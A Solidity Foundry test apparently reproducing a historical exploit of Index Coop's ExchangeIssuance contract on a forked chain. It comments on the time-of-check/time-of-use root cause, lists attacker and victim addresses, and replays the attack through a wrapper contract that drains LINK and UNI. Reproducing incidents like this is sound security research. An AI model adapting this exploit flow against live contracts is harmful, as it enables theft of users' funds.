// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";
import "../src/HistoricalAttackPayloads.sol";

// @KeyInfo - Total Lost : ~9.6K USD
// Attacker : 0x0736930ae35eafefa789f11edf41d7b799e7c99d
// Attack Contract : 0x388a3da33825e1f44ac71b8fd543523cdf994802
// Vulnerable Contract : 0xc8c85a3b4d03fb3451e7248ff94f780c92f884fd (ExchangeIssuance)
// Malicious SetToken : 0xf7c2d0a2bf81bf803ed6e1d97c89fe3b30b06948 (BHSET)
// Malicious Manager/Hook : 0x8f449d85f728c1dd6596880ba28a0b80b6a26c58
// Attack Tx (primary) : https://etherscan.io/tx/0x7f45428df558fba1d19ab115effef8ecd1e6e05b491f02202b0815e47b8d658b
// Deploy Tx : https://etherscan.io/tx/0x769db73b90da801c18c4a3862cf2366165d3b447c98074454c75df0a3a9bb7de

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xc8c85a3b4d03fb3451e7248ff94f780c92f884fd#code

// @Analysis
// Twitter Guy : https://x.com/SlowMist_Team/status/2082767887245410320
//
// Root cause: Index Coop ExchangeIssuance.issueSetForExactToken / _issueSetForExactWETH quotes a
// SetToken's component real units for swaps, then later calls BasicIssuanceModule.issue without
// locking SetToken state. A malicious manager pre-issue hook inflates positionMultiplier (via NAV
// issue/redeem with a fake SetValuer). BIM.issue then transferFroms the inflated component amounts
// from ExchangeIssuance, draining residual inventory (~93.66× the quoted amounts).

address constant ATTACKER = 0x0736930aE35EAfEfa789f11Edf41d7B799e7c99d;
address constant EXCHANGE_ISSUANCE = 0xc8C85A3b4d03FB3451e7248Ff94F780c92F884fD;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant LINK_TOKEN = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
address constant UNI_TOKEN = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
address constant AAVE_TOKEN = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
address constant BASIC_ISSUANCE = 0xd8EF3cACe8b4907117a45B0b125c68560532F94D;
address constant NAV_MODULE = 0xab63c9A4A89fbd87F61463E90e635b111d6cCB04;
address constant SET_CREATOR = 0xeF72D3278dC3Eba6Dc2614965308d1435FFd748a;
address constant SET_CONTROLLER = 0xa4c8d221d8BB851f83aadd0223a8900A6921A349;
address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

// Pre-attack block (deploy + primary drain are in 25644621)
uint256 constant FORK_BLOCK = 25_644_620;

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        // Online fork first (alias); exhaustive_warm rewrites to http://127.0.0.1:8545
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = WETH_TOKEN;
        multiAssetLog = true;
        fundingTokens.push(WETH_TOKEN);
        fundingTokens.push(LINK_TOKEN);
        fundingTokens.push(UNI_TOKEN);
        fundingTokens.push(AAVE_TOKEN);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(EXCHANGE_ISSUANCE, "ExchangeIssuance");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(LINK_TOKEN, "LINK");
        vm.label(UNI_TOKEN, "UNI");
        vm.label(AAVE_TOKEN, "AAVE");
        vm.label(BASIC_ISSUANCE, "BasicIssuanceModule");
        vm.label(NAV_MODULE, "CustomOracleNavIssuanceModule");
        vm.label(SET_CREATOR, "SetTokenCreator");
        vm.label(SET_CONTROLLER, "SetController");
        vm.label(BALANCER_VAULT, "Balancer Vault");
    }

    function testExploit() public balanceLog {
        vm.deal(ATTACKER, 5 ether);

        uint256 linkBefore = IERC20(LINK_TOKEN).balanceOf(EXCHANGE_ISSUANCE);
        uint256 uniBefore = IERC20(UNI_TOKEN).balanceOf(EXCHANGE_ISSUANCE);

        IndexCoopExchangeIssuanceTOCTOUExploit exploit =
            new IndexCoopExchangeIssuanceTOCTOUExploit(ATTACKER);

        // Historical payloads stay in the library (not in the deployable exploit bytecode)
        // so the EVM Playground can deploy the thin wrapper under EIP-170 (24KB).
        bytes[] memory calls = new bytes[](7);
        calls[0] = HistoricalAttackPayloads.init();
        calls[1] = HistoricalAttackPayloads.exp1();
        calls[2] = HistoricalAttackPayloads.mid1();
        calls[3] = HistoricalAttackPayloads.exp2();
        calls[4] = HistoricalAttackPayloads.mid2();
        calls[5] = HistoricalAttackPayloads.exp3();
        calls[6] = HistoricalAttackPayloads.sell();

        vm.prank(ATTACKER);
        // createCode + call sequence (payloads not baked into deploy bytecode → EIP-170 safe)
        exploit.attack(HistoricalAttackPayloads.create(), calls);

        uint256 linkAfter = IERC20(LINK_TOKEN).balanceOf(EXCHANGE_ISSUANCE);
        uint256 uniAfter = IERC20(UNI_TOKEN).balanceOf(EXCHANGE_ISSUANCE);

        logTokenBalance(LINK_TOKEN, EXCHANGE_ISSUANCE, "EI LINK after");
        logTokenBalance(UNI_TOKEN, EXCHANGE_ISSUANCE, "EI UNI after");
        logTokenBalance(LINK_TOKEN, exploit.attackContract(), "AttackContract LINK");
        logTokenBalance(WETH_TOKEN, ATTACKER, "Attacker WETH after");
        emit log_named_decimal_uint("EI LINK drained", linkBefore - linkAfter, 18);
        emit log_named_decimal_uint("EI UNI drained", uniBefore - uniAfter, 18);

        // Residual inventory on ExchangeIssuance is the drain signal (historical ~93.66× inflate).
        assertLt(linkAfter, linkBefore / 10, "EI LINK should be largely drained");
        assertLt(uniAfter, uniBefore / 10, "EI UNI should be largely drained");
    }
}

/// @notice Thin teaching wrapper: CREATE historical attacker, then run payload calldatas.
/// @dev Payloads are arguments (not embedded constants) so deployed bytecode stays under EIP-170.
contract IndexCoopExchangeIssuanceTOCTOUExploit {
    address public immutable profitReceiver;
    address public attackContract;

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    /// @dev Deploy historical attack contract, then run payload calldatas in order.
    /// @param createCode historical initcode (CREATE → same as 0x388a3da3)
    /// @param calls [init/approveTokens, exp1 primary drain, mid1, exp2, mid2, exp3, sell]
    function attack(bytes calldata createCode, bytes[] calldata calls) external {
        // --- beat: deploy historical attack engine ---
        attackContract = _deployHistorical(createCode);
        require(attackContract != address(0), "deploy failed");

        // --- beat: init (approve tokens) — required ---
        require(calls.length > 0, "no calls");
        _call(attackContract, calls[0]);

        // --- beat: primary TOCTOU drain (exp1) — required ---
        // Creates malicious BHSET + manager hook + fake valuer, flash-loans WETH,
        // issueSetForExactToken; BIM pre-issue hook inflates positionMultiplier (~93.66×).
        require(calls.length > 1, "no exp1");
        _call(attackContract, calls[1]);

        // Optional follow-up legs (tryCall — some may no-op depending on residual inventory).
        for (uint256 i = 2; i < calls.length; i++) {
            _tryCall(attackContract, calls[i]);
        }
    }

    function _deployHistorical(bytes memory creation) internal returns (address deployed) {
        assembly {
            deployed := create(0, add(creation, 0x20), mload(creation))
        }
    }

    function _call(address target, bytes memory data) internal {
        (bool ok, bytes memory ret) = target.call(data);
        if (!ok) {
            assembly {
                revert(add(ret, 0x20), mload(ret))
            }
        }
    }

    function _tryCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }

    receive() external payable {}
}
